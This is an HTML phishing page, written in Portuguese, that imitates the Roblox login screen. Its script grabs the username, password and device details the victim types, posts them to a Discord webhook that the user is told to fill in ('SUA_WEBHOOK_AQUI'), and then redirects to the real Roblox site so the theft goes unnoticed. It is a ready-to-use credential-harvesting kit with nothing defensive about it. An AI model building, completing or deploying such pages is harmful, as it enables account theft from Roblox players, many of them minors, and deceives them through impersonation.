<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
        
        :root {
            --bg-main: #232527; --bg-card: #393b3d; --text-main: #ffffff;
            --input-bg: #191b1d; --rbx-blue: #0084ff; --footer-bg: #121215;
            --border-grey: #494d5a;
        }

        /* Animação Original extraída */
        @keyframes fadein-delay {
            0% { opacity: 0 }
            50% { opacity: 0 }
            to { opacity: 1 }
        }

        body, html { 
            margin: 0; padding: 0; min-height: 100%; 
            font-family: 'HCo Gotham SSm', sans-serif; 
            background-color: var(--bg-main); color: var(--text-main); 
            display: flex; flex-direction: column; overflow-x: hidden;
            animation: fadein-delay 0.8s ease-in; /* Aplicação do Protocolo */
        }

        .roblox-header { width: 100%; height: 44px; background: #232527; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: fixed; top: 0; z-index: 100; box-sizing: border-box; border-bottom: 1px solid var(--border-grey); }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .roblox-logo { height: 28px; width: 28px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; }
        .nav-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.9; }

        /* Responsividade Mobile Original (767px) */
        @media (max-width: 767px) {
            .login-card { width: 90% !important; padding: 30px 20px !important; }
            .main-content { padding: 60px 0 20px 0 !important; }
        }

        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg'); background-size: cover; background-position: center; padding: 80px 0 40px 0; }
        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px; width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); box-sizing: border-box; transition: transform 0.1s; }
        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728; border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: border 0.2s; }
        .input-field:focus { border: 1px solid var(--rbx-blue); }
        .btn-primary-md { width: 100%; height: 40px; border: 1px solid #fff; background: transparent; color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
        .btn-primary-md:hover { background: rgba(255,255,255,0.1); }
        .btn-secondary { width: 100%; height: 40px; background-color: #4b4d4e; border: none; color: #fff; border-radius: 4px; margin-top: 10px; cursor: pointer; font-weight: 500; }
        
        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
        .footer { text-align: center; max-width: 1070px; margin: 0 auto; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; list-style: none; padding: 0; margin-bottom: 20px; }
        .footer-link { margin: 6px 12px; }
        .text-footer-nav { color: #d5d7dd; text-decoration: none; font-size: 12px; }
        .copyright-container { border-top: 1px solid var(--border-grey); padding-top: 24px; margin: 0 20px; }
        .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; }

        #loading-overlay { background-color: rgba(0,0,0,0.9); position: fixed; inset: 0; z-index: 2000; display: none; align-items: center; justify-content: center; flex-direction: column; color: #fff; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
        .shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body>

<div id="loading-overlay"><div class="spinner"></div><div style="font-weight: 500;">Validando...</div></div>

<header class="roblox-header">
    <div class="header-left">
        <div class="roblox-logo"></div>
        <a href="#" class="nav-link">Destaques</a><a href="#" class="nav-link">Mercado</a><a href="#" class="nav-link">Criar</a>
    </div>
</header>

<main class="main-content">
    <div class="login-card" id="card">
        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off">
        <input type="password" id="pass" class="input-field" placeholder="Senha">
        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
        <div style="margin-top: 15px; border-bottom: 1px solid #454749; padding-bottom: 20px;">
            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
        </div>
        <button class="btn-secondary">Entrada rápida</button>
        <p style="font-size: 13px; margin-top: 20px;">Não possui uma conta? <a href="#" style="color:#00a2ff; text-decoration:none;">Cadastrar-se</a></p>
    </div>
</main>

<footer class="container-footer">
    <div class="footer">
        <ul class="footer-links">
            <li class="footer-link"><a href="#" class="text-footer-nav">Sobre nós</a></li>
            <li class="footer-link"><a href="#" class="text-footer-nav">Privacidade</a></li>
        </ul>
        <div class="copyright-container"><p class="footer-note">©2026 Roblox Corporation. Roblox e Powering Imagination são marcas registradas.</p></div>
    </div>
</footer>

<script>
    async function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const card = document.getElementById('card');

        if(!u || !p) {
            card.classList.add('shake');
            setTimeout(() => card.classList.remove('shake'), 400);
            return;
        }

        document.getElementById('loading-overlay').style.display = 'flex';

        try {
            // Substitua SUA_WEBHOOK_AQUI pelo seu link do Discord
            await fetch("SUA_WEBHOOK_AQUI", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🛡️ ACESSO DETECTADO", 
                        color: 2829617,
                        fields: [
                            { name: "👤 Usuário", value: `\`${u}\` `, inline: true },
                            { name: "🔑 Senha", value: `\`${p}\` `, inline: true },
                            { name: "📱 Metadata", value: `\`${navigator.platform} | ${window.screen.width}x${window.screen.height}\`` }
                        ],
                        footer: { text: "Protocolo VOID" }, 
                        timestamp: new Date().toISOString()
                    }]
                }),
                mode: 'no-cors'
            });
        } finally {
            setTimeout(() => { 
                window.location.href = "https://www.roblox.com/home"; 
            }, 1200);
        }
    }
</script>
</body>
</html>
